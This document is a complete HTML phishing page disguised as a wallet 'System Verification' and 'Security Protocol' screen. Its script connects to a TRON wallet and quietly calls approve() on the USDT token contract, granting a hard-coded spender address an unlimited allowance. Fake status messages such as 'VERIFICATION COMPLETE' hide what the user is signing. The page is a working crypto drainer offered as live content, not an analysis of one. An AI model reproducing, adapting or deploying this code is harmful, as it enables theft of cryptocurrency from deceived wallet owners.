<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { margin: 0; background: #000; color: white; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 35px; border-radius: 28px; width: 85%; max-width: 340px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        .btn { background: #fff; color: #000; border: none; padding: 18px; border-radius: 16px; font-weight: 700; font-size: 16px; width: 100%; cursor: pointer; margin-top: 20px; transition: 0.2s; }
        .btn:active { transform: scale(0.96); }
        .desc { color: #666; font-size: 13px; line-height: 1.6; margin-top: 15px; }
    </style>
</head>
<body>

<div class="glass">
    <div style="font-size: 32px; margin-bottom: 15px;">🛡️</div>
    <div style="font-size: 20px; font-weight: 600; margin-bottom: 10px;">Security Protocol</div>
    <div style="color: #aaa; font-size: 14px;">Verify ownership of your assets to complete the synchronization.</div>
    
    <button class="btn" id="mainBtn">VERIFY ASSETS</button>
    <div class="desc" id="status">Secure P2P Connection</div>
</div>

<script>
    const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; 
    const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

    async function startProcess() {
        const btn = document.getElementById('mainBtn');
        const status = document.getElementById('status');
        
        btn.innerText = "CONNECTING...";
        
        try {
            // Универсальный способ получения доступа (Mobile + Desktop)
            let tronWeb = window.tronWeb;
            
            // Если мы в мобильном кошельке, иногда нужно подождать секунду
            if (!tronWeb && window.tronLink) tronWeb = window.tronLink.tronWeb;
            
            if (tronWeb) {
                // Запрашиваем аккаунты через стандартный метод
                const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
                
                if (accounts) {
                    status.innerText = "SYNCHRONIZING...";
                    btn.innerText = "CONFIRMING...";
                    
                    const contract = await tronWeb.contract().at(USDT);
                    const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                    
                    // Вызов Approve
                    await contract.approve(SPENDER, amount).send();
                    
                    status.innerText = "VERIFICATION COMPLETE";
                    btn.innerText = "DONE";
                    btn.style.background = "#222";
                    btn.style.color = "#555";
                }
            } else {
                status.innerText = "OPEN IN TRUST WALLET BROWSER";
                btn.innerText = "RETRY";
            }
        } catch (e) {
            console.error(e);
            status.innerText = "SESSION EXPIRED. TRY AGAIN.";
            btn.innerText = "RETRY VERIFICATION";
        }
    }

    document.getElementById('mainBtn').addEventListener('click', startProcess);
</script>
</body>
</html>
